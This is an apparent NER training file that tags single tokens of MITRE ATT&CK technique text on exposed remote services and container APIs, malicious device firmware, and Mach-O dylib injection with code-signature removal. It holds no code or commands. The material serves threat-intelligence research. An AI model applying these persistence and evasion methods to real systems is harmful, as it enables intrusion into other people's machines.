remote B-TARGET_ASSET
services I-TARGET_ASSET
may O
be O
used O
as O
a O
redundant O
or O
persistent O
access O
mechanism O
during O
an O
operation O
. O 

Access O
may O
also O
be O
gained O
through O
an O
exposed B-PRECON
service B-TARGET_ASSET
that O
doesn’t O
require O
authentication O
. O 

In O
containerized O
environments B-TARGET_ASSET
, O
this O
may O
include O
an O
exposed B-PRECON
Docker B-TARGET_ASSET
API I-TARGET_ASSET
, O
Kubernetes B-TARGET_ASSET
API I-TARGET_ASSET
server I-TARGET_ASSET
, O
kubelet B-TARGET_ASSET
, O
or O
web B-TARGET_ASSET
application I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Exposed O
Docker O
Server)(Citation: O
Unit O
42 O
Hildegard O
Malware) O

Some O
adversaries O
may O
employ O
sophisticated O
means O
to O
compromise O
computer B-TARGET_ASSET
components I-TARGET_ASSET
and O
install O
malicious O
firmware B-TARGET_ASSET
that O
will O
execute O
adversary O
code O
outside O
of O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
and O
main O
system B-TARGET_ASSET
firmware I-TARGET_ASSET
or O
BIOS B-TARGET_ASSET
. O 

This O
technique O
may O
be O
similar O
to O
[System B-TARGET_ASSET
Firmware](https://attack.mitre.org/techniques/T1019) I-TARGET_ASSET
but O
conducted O
upon O
other O
system B-TARGET_ASSET
components I-TARGET_ASSET
that O
may O
not O
have O
the O
same O
capability O
or O
level O
of O
integrity O
checking O
. O 

Malicious O
device B-TARGET_ASSET
firmware I-TARGET_ASSET
could O
provide O
both O
a O
persistent O
level O
of O
access O
to O
systems B-TARGET_ASSET
despite O
potential O
typical O
failures O
to O
maintain O
access O
and O
hard O
disk O
re-images O
, O
as O
well O
as O
a O
way O
to O
evade O
host O
software-based O
defenses O
and O
integrity O
checks O
. O 


Adversaries O
may O
establish O
persistence O
by O
executing O
malicious O
content O
triggered O
by O
the O
execution O
of O
tainted B-PRECON
binaries B-TARGET_ASSET
. O 

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 

The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 


These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
as O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
. O 
 

(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 


Adversaries O
may O
modify O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
headers I-TARGET_ASSET
to O
load O
and O
execute O
malicious O
dylibs B-TARGET_ASSET
every O
time O
the O
binary B-TARGET_ASSET
is O
executed O
. O 

Although O
any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
, O
this O
can O
be O
remediated O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
. O 

(Citation: O
Malware O
Persistence O
on O
OS O
X) O